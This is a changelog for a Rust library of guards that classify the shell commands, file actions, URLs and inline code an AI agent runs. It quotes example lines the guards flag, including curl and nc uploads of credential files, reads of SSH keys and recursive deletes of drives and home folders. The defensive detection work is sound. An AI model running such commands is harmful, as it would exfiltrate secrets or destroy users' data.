# Changelog

Every release of the milo-guards crates, newest first. The crates share one
version ([Releasing](CONTRIBUTING.md#releasing)); what a release changes for
a caller is here, what it changes inside a guard is in the commits.

## Unreleased

The crates declare an older Rust (#312): `rust-version` is 1.90, where it
was 1.99, the Rust this repository's own checks are pinned to. Nothing a
caller compiles against or a guard answers changed.

- Every crate builds, and passes its tests, with Rust 1.90, against the
  versions in this repository's `Cargo.lock`. 1.90 is what the newest
  releases of `tree-sitter-language`, which the grammars build on, declare
  (0.1.8 and 0.1.9), and a caller's default resolve picks one of them today
  whatever the guards declare; the guards' own code and their other
  dependencies build with 1.89 too.
- A caller's lockfile picks its own versions, and every requirement on a
  dependency is a range: if a later release of one needs a newer Rust,
  hold it back (`cargo update -p <crate> --precise <version>`) or resolve
  with `resolver = "3"`, which picks versions the caller's Rust supports.
- CI builds the crates and runs their tests with Rust 1.90 in a job of its
  own, advisory for now, and a release runs the same by hand (`just
  oldest-rust`). `rust-version` is raised only when a dependency, a
  language feature or a library API the code needs requires it, never
  because a new Rust is out, and a raise is a minor bump
  ([Versions](README.md#versions)).

The shell guard says where in the line each finding is (#307): a new
function and two new types, which is a minor bump.

- `locate(line, shell, &paths) -> Vec<Located>` gives `classify`'s
  findings, in the same order, from the same reading of the line, each with
  its `range`, the bytes of the line as the caller passed it that the
  finding is about, and `covers`, what that range is: `Covers::Target`, the
  word the rule that made the finding judged, as written (an operand, a
  flag, a program, a redirect's file, with its quotes, escapes, tilde,
  braces or variable), told by which argument the rule was handed and never
  by searching for a word that reads the same; `Covers::Part`, the command
  it was found in, or the word that holds the script or code it was found
  in, where no word is known to be what the rule judged (a finding with no
  target, a target the rule made, inline code); or `Covers::Line`, the
  whole line. `Located` and `Covers` are `#[non_exhaustive]`. `Finding` is
  unchanged.
- A finding of a script the line runs (`bash -c '…'`, `powershell -Command
  "…"`, a script block, cmd's `set X=1 && …`) points into the outer line:
  byte for byte where the script is the line's own bytes, and at the word or
  command that holds it where it is not (an escape, a here-document,
  `eval`'s words joined, an encoded script); inline Python and JavaScript at
  the word that holds the code. Every range is inside the line and on its
  character boundaries, in the line's own bytes across the
  backslash-newlines the guard joins and the spaces, quotes and dashes it
  writes again for PowerShell.
- `classify`, `effect`, `effect_paths` and `explain` give what they gave
  (every case line, and tens of thousands of generated lines of the three
  shells, empty and quoted-empty arguments among them, were compared with
  their answers before this change), and build nothing for the ranges when
  they are not asked for. `explain` gives no ranges.

A caller names the files it knows hold a secret, and a read of one is a
finding: a new type and a new field on `Paths`, which is a minor bump.

- `Paths::with_secrets([Secret::file(path, words)])`, or `Secret::folder`,
  names a file or a folder core's table does not list (a project's `.env`, a
  token a tool keeps in the workspace, a browser's cookie store, a password
  vault), with the words a reason calls it by. `Paths` has a public
  `secrets` field, and `Secret` is re-exported by every guard and by
  `milo-guards`.
- A read of a named secret, or of a path under a named folder, is
  `read_secret` in the shell guard and the file guard (`reads the project's
  environment file`), inside the workspace too; sending one off the machine
  is the shell guard's `send_secret`, in the same words; `effect` says a
  line that reads one, or a pattern or a folder read whole that can reach
  one, reads beyond the workspace (with a named `.env` in the workspace,
  `grep -r x .`, `ls -R` and `git status` are `Reach::Beyond`, as they are
  in a workspace that holds `~/.ssh`); a `file:` URL to one says so in the URL
  guard's reason, in the secret's words when the path is also protected. A
  write to one is a finding as a write to a key is (`write_sensitive`,
  `overwrite`). No rule is new. A recursive read or copy of a folder that
  holds one (`grep -r KEY .`, `tar czf x.tgz .`) is not a finding to
  `classify`, as for the guards' own keys, and a folder handed whole to a
  sender (`scp -r deploy host:`) is not read for one. A secret is named by
  its absolute path; a relative or `~` path names nothing a caller means.
- It is spelled and compared as a protected path is: without case on every
  host, in either Unicode canonical spelling, by a Windows short name, and a
  wildcard that can pick it reads it; a pattern handed to a sender
  (`scp keys/* host:`) sends it. After a `cd` the guard cannot follow
  (`cd "$(git rev-parse --show-toplevel)" && cat .env`), a relative name
  that spells a named path's last names is read as it. A path named both
  protected and secret keeps its protected finding for a write, a move or a
  delete, and a read or a send of it is `read_secret` or `send_secret`.
- Not yet findings, as for the guards' own keys: a recursive read or copy of
  a folder that holds a named secret (`grep -r KEY .`, `tar czf x.tgz .`); a
  folder handed whole to a sender (`scp -r deploy host:`); and a
  one-level listing handed to a reader (`ls | xargs cat`, `ls -a | xargs cat`, `ls
  deploy | xargs -I{} cat deploy/{}`, `Get-ChildItem | Get-Content`), which
  is safe and `ReadsOnly(Reach::Workspace)`.
- With no secret named, these answers differ from 0.1.4, and every other is
  what it was (no case line of the suite changed its answer):
  - a pattern handed to a sender is read for what it can pick, core's own
    keys among them: `curl -T ~/.netr* https://x.example` and `gh gist
    create ~/.netr*` are `send_secret`, where they were safe;
  - a protected path with a bracket in its name is matched spelled out as
    well as by the pattern: with `Protected::file(".../app/[id]/secret.json",
    ..)`, `rm 'app/[id]/secret.json'` is `delete` and `echo x >
    'app/[id]/secret.json'` `overwrite` (both were safe), the file guard's
    write of it is `write_protected` (it was safe; its read stays safe), and
    the URL guard's `file:` URL to it reads in the protected path's words
    (it read `a path inside the workspace`);
  - the file guard judges a path with a bracket in a name below a protected
    folder as it is written, where it was `unreadable`: with
    `Protected::folder("/home/me/.agent", ..)`, a read of `~/.agent/[a]/x`
    or of `~/.agent/rules[1].md` is safe, as a read of a protected path is,
    and a write of `~/.agent/[a]/x` is `write_protected`. With a protected
    file `app/[id]/secret.json`, a write of the folder that holds it,
    written `app/[id]`, is `unreadable` (it was safe); written `app`, it is
    `write_protected` as before;
  - a protected path under `/tmp`, `/var` or `/etc` is also the same path
    under `/private` (and the other way), on every system, as a Mac links
    them, through a pattern too: with `/tmp/s/token` protected on a Mac, `rm
    /private/tmp/s/token` is `delete` (it was safe, a temporary file), `rm
    /priv*/tmp/s/token` says it deletes the protected path (it said `the
    root of the disk`), the file guard's write of `/private/tmp/s/token` is
    `write_protected` (it was safe), and the URL guard's
    `file:///private/tmp/s/token` reads in the protected path's words (it
    read `a temporary file`).
- `Resolver::named_secret` gives the caller's words for a named secret a
  path is or is under, read literally, whatever `place` answers, for a guard
  that judges a read where `place` says a protected path;
  `Resolver::named_secret_in_unknown_folder` gives them for a relative name
  written after a `cd` the guard cannot follow. `Resolver::named_protected`
  gives the caller's words for a protected path a path is or is under, read
  literally, and `Resolver::cwd_is_clear_but_for_named` says the working
  directory holds no key of core's own, only named secrets.

A guard for the Python and JavaScript an agent runs directly, through a code
tool with no shell line around it (#304): a new crate with a new `Rule` enum,
which is a minor bump.

- `milo-guards-script`, re-exported as `milo_guards::script` behind the
  `script` feature, on by default: `judge(Language, code, &Paths)`. It reads
  the code with the code reader and judges each act it is certain to do as
  the shell guard judges the same code after `python3 -c` or `node -e`,
  with the shell guard's wire names and reasons: `delete`, `wipe_disk`,
  `overwrite`, `permissions`, `read_secret`, `run_downloaded`, `unknown` and
  `unreadable`, `instead` included, and `… if a cd before it failed or did
  not run` after a `chdir`. Protected paths and named secrets are honoured as
  in a shell line, another user's keys (`~alice/.ssh/id_rsa`) are read where
  systems keep them, and on Windows a stream, a part ending in a space or a
  dot and the `\??\` prefix are read for the file they name; a read of a
  path that cannot be placed is `unknown`. Code read whole that does nothing
  risky is safe (`print(1)`); code not read whole is `unknown`, never safe;
  Python that declares another encoding is `unknown`, as it runs from a file
  or its input; code too long, too deep or that does not parse is
  `unreadable`, and so is code the reader stops on, past the work it may
  do for it (`takes too long to read`; every reading the guard makes of one
  piece of code draws from one `Budget`). Code that does not parse is not
  read through its error: nothing in it is found.
- `run_program` is the new guard's own rule: code that starts a program or
  runs a command in a shell. The guard does not judge the program, which is
  the shell guard's; the finding's target is the command as a line of the
  machine's shell: for `Shell::Posix` (`git push --force`, `cd -- /tmp && ls`
  for a program run from another directory, a word only known when the code
  runs written `"$UNKNOWN"`, a reserved word quoted), and on a Windows
  machine for `Shell::Cmd`, which `os.system` runs there (`rd /s /q
  C:\Users\me`, `cd /d DIR && …`). On Windows a target is
  only ever words that cmd and the C runtime both read as themselves, bare
  or in plain double quotes for a space: a program with a word that holds a
  character cmd reads as its own (`& | < > ( ) ^ % ! "`), whatever the
  program is, a word only known when the code runs, a line that starts with
  a quote, code that may hand a shell a list (also in nested code, and
  `shell` by `**`, `*` or position), and a directory read as a switch or
  only known when it runs give no target, and an `unknown` says so. `target_shell(&paths)` says which shell a target is for
  (`TargetShell::Posix` or `TargetShell::Cmd`). Code that starts a
  program is never read whole, so it is always `unknown` too: a safe answer
  for the program never makes the code safe. Input the code gives a program
  is an `unknown` of its own.
- The code reader has `parses(language, code)`, whether the code's grammar
  reads it with no error, `gives_input(language, code)`, whether the code
  may give a program it starts input, and `gives_shell_a_list(language,
  code)`, whether it may hand a shell a list of words. Code the reader stops
  on (below) does not parse, and may give input and hand a shell a list.
- No answer of another guard changed. A front-door test
  (`crates/guards/tests/agree_code.rs`) holds the new guard's whole answer,
  combined with the shell guard's for each program, to the shell guard's for
  the same code after `python3 -c` or `node -e`, rule, reason and `instead`:
  for every case of the code reader's and the shell guard's inline case files
  on a POSIX machine, a Mac and a Windows one, and for code made there
  (one to eight `chdir`s, the kernel's files, protected and named secret
  paths); a program on a Windows machine is held to every file act the shell
  guard finds in the code, through cmd's reading of its target. Where
  the two differ by design, the script guard saying more and never less (a
  coding declaration, input to a program, a read of a path that cannot be
  placed, a Windows path on a Windows machine, which the shell guard's inline
  reading reads as POSIX) the test says why; what still differs otherwise is
  listed with both answers: code that writes a script and runs it, and a
  nested `python3 -c` on Windows that the shell guard's cmd reading only
  calls `unknown`.

The URL guard judges the address a fetch connected to, with its own tables
(#308): a new public function, which is a minor bump.

- `milo_guards_url::judge_address(address)`, re-exported as
  `milo_guards::url::judge_address`, judges one IP address the caller
  resolved a name to or connected to, given as text: `local_address` or
  `metadata`, with the reason and target `judge` gives the same address as a
  URL's host, or safe. It is for what `judge` cannot see without a lookup: a
  public name whose DNS points at this machine, the local network or a
  metadata service. Judge the URL, then the address of the connection
  actually used, before any byte of the request is sent; an address the
  caller resolved itself only when it connects to that literal and never to
  the name again; behind an HTTP or SOCKS proxy, at the proxy. A redirect is
  judged again, URL and address. No rule is new, and it takes no `Paths`.
- It reads the address with the parser `judge` reads a host with, so every
  spelling is read and answered alike: `judge_address(a)` is
  `judge("http://a/")` whenever that URL's host is an address (and
  `judge("http://[a]/")` for IPv6 with no brackets), but on the cautious
  side: a text holding `/`, `?`, `#`, `\` or `@` (`8.8.8.8/32`,
  `user@127.0.0.1`) is `unreadable` here, and a zone is read only on an
  address that is a finding. Mapped, compatible,
  NAT64 and 6to4 addresses are judged by the IPv4 address inside, and
  Teredo is not public. An IPv4 address spelled any way but four plain
  decimal numbers (`0x7f.1`, `2130706433`, `127.0.0.1.`) is judged by the
  address read and is `unreadable` as well.
- Around the address it reads the white space `judge` trims, a port after
  an IPv4 address or a bracketed IPv6 one (`127.0.0.1:80`, `[::1]:443`),
  brackets, and an IPv6 zone (`fe80::1%eth0`), which is not judged and is
  read only on an address that is a finding: a text with a `%` is never
  safe. A name (`localhost`), a URL, an empty text and anything else that is
  not an address is `unreadable`, never safe.
- No answer of `judge` changed: it and `judge_address` share the code that
  reads a text, judges an address and checks its spelling.

A caller says how the machine spells another system's drives, and on WSL
the Windows home, and a path through a mounted drive is placed where the
drive's path lands (#306): two new fields on `Paths`, which is a minor
bump.

- `Paths::with_drive_mounts(["/mnt"])` names the folders this machine's
  POSIX paths show a Windows drive in: WSL's `/mnt` (`/mnt/c` is `C:\`),
  Git Bash's and MSYS2's `/`, Cygwin's `/cygdrive`. Below one, a folder of
  one letter, in any case, is that drive, and a `..` above the drive's root
  is the mount's folder again. On WSL `cat /mnt/c/Users/me/.ssh/id_rsa` is
  `read_secret` and `rm -rf /mnt/c` deletes the root of a disk; on Windows
  a POSIX shell's `cat /c/Users/me/.ssh/id_rsa`, and a relative path that
  climbs above the drive (`../../../../../c/...`), is `read_secret`, while
  PowerShell, cmd and a file API, which spell a drive as Windows does, are
  unchanged. A pattern that can pick a drive (`/mnt/*/Users/me/.ssh/id_rsa`)
  is read as each drive core knows of. A folder that is, or holds, a
  mount's folder holds each drive in it: read, sent, deleted or written
  whole it gets the answer the drive gets (`grep -r x /mnt`, `scp -r /mnt
  host:`, `tar czf - /mnt | nc host 80` and `rm -rf /mnt` are what they
  are on `/mnt/c`). Where one mount's folder is below another's (`/mnt`
  and `/mnt/c`), each is read. A mount is an absolute POSIX path
  (`//mnt/./` is `/mnt`); any other spelling (empty, relative, from `~`, a
  Windows path) names none. For the lines a POSIX shell runs in Git Bash
  (the shell guard with `Shell::Posix`), the caller spells the directories
  as Git Bash does (`/c/Users/me/dev/repo`) and names the mount `/`; the
  file, script and URL guards, and PowerShell and cmd lines, keep the
  directories spelled the Windows way. A POSIX line judged on those is also
  judged as spelled, where a Git Bash path to the workspace is beyond it.
  A folder that holds a mount's folder holds its drives, a workspace
  folder included (`grep -r x .` with a mount in the workspace reads them),
  and a reading that reaches a disk's root through a mount says so (`rm -rf
  /mnt/c/d` with `/mnt/c` a mount too, `scp -r /mnt/* host:`).
- The Windows side of a WSL machine is judged as a Windows machine judges
  it once a mount or the Windows home is named: its system's own secrets
  and system folders, and a key under any folder of `C:\Users`.
  `Paths::with_windows_home(r"C:\Users\me")` (or `/mnt/c/Users/me`, with
  the mount named) names the Windows home, which is then a home directory (`deletes your home
  directory`) with its keys, startup files and temporary folder; without it
  the drive is `C:` and no folder there is the user's own home.
- **Naming them never makes an answer less serious.** Every guard judges
  its input on the `Paths` it is given and on the same `Paths` with no
  mount or Windows home (`Paths::as_spelled`), and keeps every finding of
  both; the shell guard's `effect` is the most cautious of what each
  judging says, and `effect_paths` lists paths only when that is
  reads-only; a `file:` URL keeps the more telling words of the two, a
  key's, then any other sensitive or protected place's. So a mount adds
  what a drive's path is and takes nothing away: on WSL, a write to
  `/mnt/c/Windows/Temp/x` stays beyond the workspace, as spelled. Core's
  `Resolver` answers where a path lands on the directories it is given; a
  caller of it that wants the guards' answer asks it of
  `Paths::as_spelled` too.
- The home directory, each workspace folder, each protected path and each
  secret the caller names are compared both as spelled and where they land
  through a mount; `Resolver::workspace_of` gives the workspace as the
  caller spelled it, and `absolute` and `opened` still say how a path is
  spelled. A workspace that holds a mount's folder is not clear
  (`cwd_is_clear`). The walk through the mounts spends a counted budget of
  1,048,576 for each resolver; past it a path is only known when it runs.
- No rule is new and no `Rule` enum changes. With no mount and no Windows
  home named, nothing of this runs and every answer is what it was: no case
  line of the suite changed its answer. A front-door test
  (`crates/guards/tests/never_less_serious.rs`) holds every case of every
  guard's case files, and a generated set of paths read, written, deleted
  and sent, to keep every rule it finds with nothing named once hostile
  mounts are named, the shell's effect to be no less cautious, and a `file:`
  URL whose reason names a sensitive place to name one still; `agree.rs` holds the shell, the
  file, the script and the URL guards to one answer for writes, deletes,
  sends and reads through the mounts, and the shell and the file guard for
  reads of every spelling through them; `agree_code.rs` holds the script
  and the shell guards to one answer for code acting through the mounts.
- The case files' `paths` line reads `drive_mount=` and `windows_home=`.

A caller names the links it has resolved, and a path through one lands
where it points, the second part of #306: a new type (`Links`, with `Link`)
and a new field on
`Paths`, which is a minor bump.

- `Paths::with_links([Link::new(path, target)])` names a link the caller
  found and what it holds (absolute, or relative to the link's folder, as
  the system hands it over: a POSIX path on a POSIX machine, a Windows one
  on Windows, a junction's `\??\C:\x` included); `Link::unknown(path)` a
  link it could not read. A relative `path` is read from the first
  workspace folder (a `~` one from the home directory), never from the
  working directory; an empty one names nothing. A path through a link is
  placed where it lands, by every guard: with `keys` a link to `~/.ssh`, a
  read of `keys/id_rsa` is `read_secret`, and a write through a link into a
  protected path, a startup file or out of the workspace is the finding a
  write there is.
- **Naming them never makes an answer less serious.** Every guard judges
  its input on the `Paths` it is given and on each of
  `Paths::also_judged_on`: `Paths::as_spelled` (no link, mount or Windows
  home) and `Paths::mounts_alone` (the links dropped, the mounts kept), and
  keeps every finding of each; the shell guard's `effect` is the most
  cautious of what each judging says on its own and together, and a `file:`
  URL keeps the more telling words. So a link never takes away what a mount
  says.
- A `..` after a link is read as the text spells it, as a POSIX system
  climbs it, and, for each `..` after the first link, with the `..` before
  it applied to the text and the rest walked: a `cd` goes by the text, the
  path after it is opened by the system, and each combination is read
  (`cd p/lnk/../.. && cat p/lnk/../id_rsa`, `cd -P`, `pushd`, a subshell, a
  working directory through a link). A mount's folder is also where it lands
  through the links (`/mnt` a link to `/media`).
- A name a link lends what it lands on (`dotfiles/ssh/id_rsa` for
  `~/.ssh/id_rsa`) counts for what it means by itself: a key, a protected
  path, a startup file, the repository's history; never a place beyond the
  workspace, a system folder or a share, so a link into the workspace
  (`~/current`, a web server's folder, a share's) makes none of it beyond.
  A link named where another link lands lends the other's name too
  (`s/keys` is `~/.ssh/keys` when `~/.ssh` is a link to `s`), and a
  workspace a link lands in or above (a stow layout, `~/.config` a link to
  the `dotfiles/config` it is in), through other links or not, is one whose
  plain names are looked up in full.
- A folder holds what a link below it lands on only for a tool that follows
  the links it meets (`grep -R`, `find -L`, `cp -L`, `rsync -L`, `-k`,
  `-K` and `--copy-unsafe-links`, `tar -h`, `scp -r`, `zip -r`,
  `chown -RL`, `shutil.copytree`, and `cp -r`, which follows them on macOS
  and the BSDs, FreeBSD's even after `-P`, and is read so on every POSIX
  line unless a `-P` comes after it, a false alarm for GNU's); `rm -rf`,
  `mv`, `chown -R`, `find -delete` and `shutil.rmtree` act on the links.
  POSIX `rm`, `unlink` and `mv`, and cmd's `rd`, of a path that is itself
  a link act on the link (a trailing `/` goes through it), and a pattern
  they are given reads the links it can pick as names; every other delete
  or move goes through it: `shred` and `srm` overwrite what it points to,
  `del` of a folder empties it, `Remove-Item` may follow a junction
  (Windows PowerShell 5.1 does), `rsync --delete` deletes in it, and a
  `find -L` or `-H` hands on what is below it. What each folder holds is worked out when the tree is built, so
  asking costs a lookup for each part of a path, whatever the number of
  links, and a pattern does not read again through a link that lands on
  nothing serious (a package manager's links into its store).
- The tree of the links is built the first time a guard judges with the
  directories, for every field but the working directory, and kept with the
  list for every later call and copy; naming links one at a time costs what
  naming them at once does. A link named below another is placed through it,
  in rounds, the same in any order; one named more than nine levels deep
  is lost, every path through it only known when it runs. Past the build's
  own counted budget (33,554,432), past 262,144 links, or past 1,048,576
  parts of their names and targets in all (`MOST_LINK_PARTS`, a part
  counting once more for each 64 bytes in it), no link is held and every
  path is only known when it runs, whatever the order. The tree keeps about
  1.1 KB for each package manager's link, and its build takes about 3 KB
  and 7 to 10 microseconds for each, in time linear in the parts: at the
  bound, about 0.75 seconds and 285 MB at the most for 104,000 such links,
  and 1 second and 440 MB for links 60 folders deep in folders of their
  own, the dearest measured: a caller that starts a process for each
  tool call pays it on every call.
- A path through more links than any system follows (63, Windows's), a
  link that cannot be read or placed, or past the counted work one resolver
  may spend (1,048,576) is only known when it runs: `unreadable` to the
  file guard, and to the shell and the script guards a read or a send of it
  is `unknown`, `reads a path only known when it runs`. A link that lands on
  a share adds the file guard's `network_share`, and the URL guard's `file:`
  URL says it reads a file from another machine.
- New `Resolver` questions: `lost`, `lands_on_share`, `linked_holder`,
  `through_link` and `wild_links`. `cwd_is_clear` is false for a workspace
  with a named link in it; a workspace folder that is itself a link is the
  workspace by both names.
- No rule is new and no `Rule` enum changes. With no link named, every
  answer is what it was: no case line of the suite changed its answer but
  those that name a link. A front-door test
  (`crates/guards/tests/never_less_serious.rs`) holds every case of every
  guard's case files, and a generated set of paths read, written, deleted
  and sent, to keep every rule it finds with nothing named once hostile
  links are named, and every rule it finds with mounts named once links are
  named beside them, the shell's effect to be no less cautious, and a
  `file:` URL whose reason names a sensitive place to name one still.
- The case files' `paths` line reads `link=` followed by its `to=` (an empty
  `to=` is a target the guard cannot place); core's case files ask `linked`
  and `lost` too.

The reader of Python and JavaScript holds every reading to a budget, and
reads no code through a syntax error: a new public type, part of the same
minor bump. These are security fixes: code the reader could take very long
to parse, or a lot of memory or stack to parse, is now answered within a
bounded amount of work.

- `milo-guards-code`: code with a syntax error is not read through it.
  `read` gives an `Unread` act alone, where it gave one beside what it found
  past the error; `understand` says `NotUnderstood` and `parses` no, as
  before; `gives_input` and `gives_shell_a_list` say it may. The parse stops
  where tree-sitter starts to recover from the error, so code whose error
  recovery was costly is answered so in milliseconds. Literal code `exec` or
  `eval` run with an error in it raises before it runs, as before: it is the
  code act it is, and what is beside it is read.
- `milo-guards-code`: `Budget` is the work the reader may do for code, or
  for a line that holds code, counted as the grammars and the reader's walk
  go and never by a clock (see Limits in `docs/design/code.md`).
  `Budget::new(len)` makes one (a length past the reader's limit is the
  limit); `Budget::read`, `understand`, `understand_python2`, `parses`,
  `gives_input` and `gives_shell_a_list` ask the same questions as the
  functions of those names within it, each question asked again of the same
  code answered from the tree the budget keeps, with no parse;
  `Budget::is_spent` says whether a reading within it was stopped. A budget
  is `Send`, not `Sync`, and its `Debug` shows what it spent, never the code.
  The functions each make one for the code they are given. Past it a
  reading is stopped and the code is not read: `read` gives an `Unread` act
  (alone when the code's own parse was stopped; beside what the walk found
  around literal code `eval` or `exec` runs, when that parse was),
  `understand` says `NotUnderstood`, `parses` says no, and `gives_input` and
  `gives_shell_a_list` say yes, also when a question's own walk runs out part
  of the way; every reading after it within the same budget is stopped
  before it starts.
- `milo-guards-code`: code is scanned before it is parsed, and not read
  when it is longer than `MAX_LEN` (`read` and `understand` refuse it
  themselves), when its openers nest deeper than `MAX_TREE_DEPTH`, or when
  it holds more than a few of the shapes the grammars read two ways at once
  at a cost that grows faster than the code, counted both as the text is
  read and on its bytes alone; Python with more than four stars where Python
  allows none (after an operator, or a keyword that takes an operand) is
  code that does not parse, as Python says. Code with more than four spaces
  outside its strings and comments that a grammar passes over but that are
  not ASCII ones (a zero-width space, U+2060, a no-break space, the vertical
  tab) is not read. No real file of 73,696 is refused, and every reading
  within these bounds fits a thread of 1 MiB.
- `milo-guards-shell`: every reading of the inline code of a line, and of the
  code inside that code, is held to one budget for the line, so nesting and
  pieces do not multiply the work. Code the reader stops on, or that has a
  syntax error, given to `node -e`, `python3 -c`, on an interpreter's input
  or in a here-document, is `unknown`, `runs code the guard does not read`,
  and `effect` is `Unknown`, with what the line does beside it kept.
- `milo-guards-script`: one budget for each piece of code, shared by its
  judgings on each set of the paths; code the reader stops on is
  `unreadable`, `takes too long to read`.
- `milo-guards-code`: a list of arguments to a program is built in time
  that grows with it, and a chain of assignments is followed to its end once
  for the chain; past some hundred links the reader's own work stops it.
- What changes for code that read before: code with a syntax error is not
  read for the acts beside the error. In the shell guard a line that was
  `delete` and `unknown` for such code is `unknown` alone; in the script
  guard it was `unreadable` already, and is so alone. Of some 28,000 files
  of real Python and JavaScript, 28 change: 22 of JavaScript with Flow
  types, an editor's backup of a half-written file, and 7 of runnable
  JavaScript the grammar does not read (private class fields after a line
  with no semicolon in `undici`, `export { _null as null }` in `zod`, and
  two more), in which the earlier reader found no file act. Code in syntax
  newer than the grammars know runs, and is not read either: Python 3.15's
  `lazy import` and `lazy from … import`, type parameter defaults (`def f[T
  = int]()`), JavaScript's `export { _null as null }`: such code is not
  read, as code past the length limit is not, and is `unknown` in the shell
  guard where an act in it was found before. This is a known limit; reading
  a tree with a few small errors beside them is possible later work. Two
  case lines of the script guard (`import shutil; shutil.rmtree('/home/me');
  if 1:`, and its JavaScript twin) no longer find the delete. Python with a
  long run of comment lines in or after a block, read with tree-sitter's
  log, is not read past the bytes handed (no real file has such a run); and
  valid code longer than a kilobyte or two is read with tree-sitter's log,
  since only the log sees two ways of reading the code that never part.

The reader of Python and JavaScript reads code of at most 3 KiB, a
deliberate limit of this release: `milo_guards_code::MAX_LEN` (and the
script guard's `MAX_LEN`, the same) is 3 KiB, where it was 64 KiB.

- Longer code is not read, before it is scanned or parsed: `read` gives an
  `Unread` act, `understand` says `NotUnderstood` and `parses` no. The
  script guard calls it `unreadable`, `is too long to read`; the shell
  guard calls the inline code of a line that long (`python3 -c`, `node -e`,
  an interpreter's input, a here-document) `unknown`, `runs code the guard
  does not read`, as it calls any code the reader does not read. A shell
  line's own limit stays 64 KiB.
- The limit bounds the cost of a reading whatever the scan before a parse
  makes of the code: within it, every costly shape measured costs at most
  0.16 s and 221 MB for a call, a judged piece of code or a shell line in a
  release build, and fits a thread of 1 MiB (the measurements are in
  `docs/design/code.md`, The length limit).
- Many real scripts are longer: of the corpora the limits were measured on,
  some three in five files of Python and one in three of JavaScript (up to
  64 KB) are, and the script guard no longer judges them act by act. No case
  line and no everyday answer changed: none holds code that long.

Answers that change, with no new rule and no change to the API: some
are more serious than 0.1.4's.

- `milo-guards-shell`: the command a program starts after its own
  options is judged as written: Windows' `conhost`, Windows Terminal's
  `wt` (each tab and pane), `psexec`, `PsExec64` and `paexec` (`elevated`
  too), `gsudo` with its own options, `nircmd`, `pcalua`, and rundll32's
  `ShellExec_RunDLL`, `FileProtocolHandler` and `RouteTheCall`; and on POSIX
  systems `toybox`, `tsp`, `nq`, `dbus-launch`, `dbus-run-session`,
  `xvfb-run`, `tini`, `dumb-init`, `runuser`, `sg`, `setpriv`, `numactl`,
  `cgexec`, `capsh`, `gosu`, `su-exec`, `chpst`, daemontools' `setuidgid`,
  `envuidgid`, `envdir`, `softlimit`, `setlock` and `pgrphack`,
  `flatpak-spawn`, `distrobox enter`, `toolbox run`, and a terminal
  emulator's `-e`, `-x` or `--`. An option the guard does not know given
  to `conhost`, `wt`, `psexec`, `gsudo`, `tsp`, `nq`, `dbus-launch`,
  `dbus-run-session`, `runuser`, `setpriv`, `numactl`, `cgexec`,
  `dumb-init`, `flatpak-spawn` or `toolbox run` makes the command
  `unreadable`. `Invoke-WmiMethod` and `Invoke-CimMethod` of
  `Win32_Process` `Create` are `unknown`, as `wmic process call create` is.
- `milo-guards-shell`: a command a program runs because the line names it
  in a variable, set in front of the program, with `env`, `export`,
  PowerShell's `$env:` or cmd's `set`, is read as a line and judged: git's
  `GIT_SSH_COMMAND`, `GIT_SSH`, pager, editor, external diff, askpass and
  proxy variables, `RSYNC_RSH`, `LESSOPEN`, `MANPAGER`, and the pager and
  editor variables of `crontab`, `visudo`, `systemctl` and systemd's other
  tools, `gh`, `aws`, `kubectl`, `bat`, `svn`, `hg` and OpenSSH. A value
  only known when it runs is `unknown`; PowerShell's `$null` removes the
  variable. psql's pager and editor are read on Windows lines too. A
  program is read with at most 64 values of its variables, and the
  readings share the bound of `npm_config_call`'s; past either, the line
  is `unreadable`.
- `milo-guards-shell`: so is a command an option names: OpenSSH's
  `ProxyCommand`, `LocalCommand` and `KnownHostsCommand` settings (for
  `ssh`, `scp`, `sftp`, `autossh`, `ssh-copy-id` and `sshfs`, with its
  `ssh_command`), `scp -S`, `sftp -S` and `-D`, `mosh --ssh`, git's `rebase
  -x`, `bisect run`, `grep -O`, `difftool -x`, `--upload-pack`,
  `--receive-pack` and `send-email`'s `--sendmail-cmd`, `--to-cmd`,
  `--cc-cmd` and `--header-cmd`, `sort --compress-program`, a `less`
  command with `!`, `rg --pre`, and `fd -x` and `-X`, whose command is
  judged as written. `git clone -c` is read as `git -c` is. A library
  OpenSSH is told to load (`-I`, `PKCS11Provider`, `SecurityKeyProvider`)
  is `unknown`. The `effect` of `fd -x rm` and of `less +'!rm x' f` is
  `Changes`.

## 0.1.4 (2026-11-22)

What the URL guard answers for a few `file:` URLs and odd spellings, nothing
a caller compiles against: a patch.

- `milo-guards-url` needs `url` 2.5.9 or newer. With an older `url` in the
  caller's lockfile, a `file:` URL with a host and a drive letter
  (`file://example.com/C:/Users/me/x`) lost its host: on a Windows machine
  it read as a local path, and the host was not judged. It is now `reads a
  file from another machine`, with the host's own findings, whatever the
  lockfile held. Such a URL was a finding before and after.
- With `url` 2.5.9, a URL of a scheme without a default port and a
  backslash after its port (`foo://example.com:80\9`) is `unreadable`, where
  it was `scheme`; and a `^` in a path is shown percent-encoded (`%5E`) in
  the target of a `credentials` finding.
- `url` 2.5.9 mends RUSTSEC-2026-0592, a stack overflow in `Url::origin()`.
  The guard never calls it, so no released version of the guard is affected.

## 0.1.3 (2026-11-21)

The pages on crates.io, nothing a caller compiles against or a guard answers.

- The README no longer says a command-line program is planned, with npm and
  Homebrew packages: the guards are a Rust library and ship no program.
- The crates are published by a workflow when the release tag is pushed,
  with no stored crates.io token (trusted publishing). This is the first
  release made that way.

## 0.1.2 (2026-11-07)

Lines the guards judged wrong, nothing a caller compiles against: a patch.
Each line below was safe, or slow, and is now judged as it reads.

- `milo-guards-shell`: an `alias` with a word only known when it runs
  (`alias x="$CMD"`) is `unknown`, and a call of it no longer slips through
  as an unknown bare name (#285).
- `milo-guards-shell`: the files `find` writes with `-fprint`, `-fprint0`,
  `-fls` and `-fprintf` are judged as a redirect's are, so
  `find . -fprint ~/.bashrc` is `overwrite` (#287).
- `milo-guards-shell`: `firejail`, `fakeroot`, `faketime`, `entr`, `bwrap`
  and `proot` run the command after their options, which is judged as
  written; `bwrap` and `proot` map the file system, so their lines are
  `unreadable` as well. `man -P CMD`, `man -H CMD` and fzf's
  `--preview CMD` hand a command to a shell, which is read; a key binding of
  fzf (`--bind`) is `unreadable` (#288).
- `milo-guards-core`: a write into a long wildcard pattern is placed in time
  linear in its parts; a line of 60 KB of `**/` took 15 s and takes a tenth
  of one (#286).
- `milo-guards-core`: the home directory, the sensitive places and the
  protected paths compare in either Unicode canonical spelling (`é` as one
  character, or `e` and a combining accent, as HFS+ keeps it), so the file
  guard's `write_protected` and the shell guard's findings hold for both
  (#290).
- `milo-guards-code`: code nested past the depth the reader walks is never
  `Understood` (#289).

## 0.1.1 (2026-11-05)

The pages on crates.io, nothing a caller compiles against or a guard answers.

- Each crate carries a README of its own (what it reads, how to depend on
  it, its example, compiled with the doctests), where every crate showed the
